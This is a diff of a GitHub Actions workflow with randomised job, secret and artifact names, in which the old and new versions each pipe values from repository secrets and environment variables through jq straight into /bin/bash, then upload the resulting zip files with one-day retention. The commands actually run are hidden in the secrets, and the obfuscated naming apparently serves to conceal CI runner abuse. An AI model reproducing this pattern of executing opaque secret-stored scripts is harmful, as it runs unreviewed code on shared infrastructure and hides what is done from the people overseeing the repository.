@@ -1,8 +1,7 @@
 name: valentinaux2675
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '7 3,9,15,21 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,36 +9,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: valentinaux2675
         env:
-          frr9489: ${{ secrets.frr9489 }}
+          kdf31902: ${{ secrets.kdf31902 }}
         run: |
-          printf '%s' "$frr9489" | jq -r .pcc50274 | /bin/bash
-          echo $tjsun1 | jq -r .ah534 | /bin/bash
-          echo $o481 | jq -r .tizhc18 | /bin/bash
-          echo $mdx7 | jq -r .mv7 | /bin/bash
-          echo $kez79 | jq -r .y596 | /bin/bash
-          echo $ld79739 | jq -r .j99 | /bin/bash
-          echo $lyob136 | jq -r .gy7608 | /bin/bash
-          echo $sgndr2 | jq -r .e92001 | /bin/bash
-          printf '%s' "$brlgd41" | jq -r .juuew32117 | /bin/bash
-          echo $pj27894 | jq -r .e251 | /bin/bash
-          echo $euf57591 | jq -r .zsp42 | /bin/bash
-          printf '%s' "$duae2606" | jq -r .qr588 | /bin/bash
-          echo $fgs99153 | jq -r .rfo6768 | /bin/bash
-          echo $fahth970 | jq -r .qwmpx60 | /bin/bash
-          echo $gjou95 | jq -r .qcu16453 | /bin/bash
-          echo $wks09968 | jq -r .omqyp66 | /bin/bash
-          printf '%s' "$bdmwd97" | jq -r .opy2158 | /bin/bash
-          printf '%s' "$ngn376" | jq -r .svc4 | /bin/bash
-          echo $dx9 | jq -r .ijthi9 | /bin/bash
-          printf '%s' "$lv9908" | jq -r .v26956 | /bin/bash
-          printf '%s' "$obap5" | jq -r .zkmj58 | /bin/bash
-          echo $tyu5 | jq -r .ir3230 | /bin/bash
-          printf '%s' "$c9891" | jq -r .smal3 | /bin/bash
-          printf '%s' "$fz9490" | jq -r .heria0 | /bin/bash
+          printf '%s' "$kdf31902" | jq -r .bijz4344 | /bin/bash
+          echo $hpq22533 | jq -r .e43175 | /bin/bash
+          printf '%s' "$ctr5" | jq -r .v24031 | /bin/bash
+          printf '%s' "$hjvae76840" | jq -r .vipsa7448 | /bin/bash
+          printf '%s' "$fval15" | jq -r .xzuu0355 | /bin/bash
+          echo $szxfo8873 | jq -r .ahe70 | /bin/bash
+          echo $n741 | jq -r .sunv4339 | /bin/bash
+          echo $uya23360 | jq -r .ia675 | /bin/bash
+          printf '%s' "$u355" | jq -r .ej0047 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: 3p3sK4fH
+          name: JdZwx9AR
           path: "*.zip"
           retention-days: 1
